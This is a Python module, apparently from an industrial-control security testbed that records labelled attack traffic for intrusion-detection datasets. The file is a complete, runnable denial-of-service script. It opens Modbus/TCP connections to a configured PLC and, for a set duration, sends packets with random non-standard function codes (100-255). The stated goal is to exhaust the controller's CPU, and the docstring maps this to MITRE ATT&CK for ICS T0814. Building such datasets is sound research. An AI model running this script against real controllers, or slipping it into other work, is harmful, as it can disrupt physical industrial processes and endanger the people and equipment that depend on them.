"""
Attack #5: Function_Code_Fuzzing (Function Code Fuzzing)
==================================================================
Target register: none specific - raw Modbus function-code fuzzing
Technique: Sends packets with non-standard function codes (100-255) to
           the PLC.
Effect: The PLC raises an exception for every unrecognized function code,
        wearing down its CPU.
MITRE ATT&CK for ICS: T0814 - Denial of Service
"""
import time, socket, struct, random, sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from attacks.config import PLC_IP, PLC_PORT, UNIT_ID, LABEL_FC_FUZZING

ATTACK_NAME = "Function_Code_Fuzzing"
ATTACK_ID   = LABEL_FC_FUZZING
FUZZ_DELAY  = 0.02

def _build_fuzz_packet(fc, txn_id=1):
    mbap = struct.pack('>HHHB', txn_id, 0, 3, UNIT_ID)
    pdu = struct.pack('>BB', fc, 0x00)
    return mbap + pdu

def run_attack(duration_sec=600, label_manager=None):
    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target: {PLC_IP}:{PLC_PORT}")
    print(f"  FC range: 100-255 (non-standard)")
    print(f"  Duration: {duration_sec}s ({duration_sec//60} min)")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(ATTACK_ID, ATTACK_NAME, "FC range=100-255")

    start_time = time.time()
    pkt_count = 0
    err_count = 0
    sock = None

    try:
        while (time.time() - start_time) < duration_sec:
            if sock is None:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((PLC_IP, PLC_PORT))
                except Exception:
                    sock = None
                    time.sleep(1)
                    continue

            fc = random.randint(100, 255)
            try:
                pkt = _build_fuzz_packet(fc, pkt_count % 65535)
                sock.sendall(pkt)
                pkt_count += 1
                try:
                    sock.recv(256)
                except socket.timeout:
                    pass
            except (BrokenPipeError, ConnectionResetError, OSError):
                err_count += 1
                sock.close()
                sock = None

            if pkt_count % 200 == 0 and pkt_count > 0:
                rem = duration_sec - (time.time() - start_time)
                print(f"  [FUZZ] {pkt_count} packets | errors: {err_count} | remaining: {rem:.0f}s")
            time.sleep(FUZZ_DELAY)

    except KeyboardInterrupt:
        print("\n  [FUZZ] Manual stop!")
    finally:
        elapsed = time.time() - start_time
        if sock: sock.close()
        if label_manager:
            label_manager.log_attack_end(ATTACK_ID, ATTACK_NAME,
                f"{pkt_count} packets, {err_count} errors, {elapsed:.1f}s")
        print(f"\n  [FUZZ] {pkt_count} packets, {err_count} errors, {elapsed:.1f}s")
        return True

if __name__ == "__main__":
    run_attack(duration_sec=60)
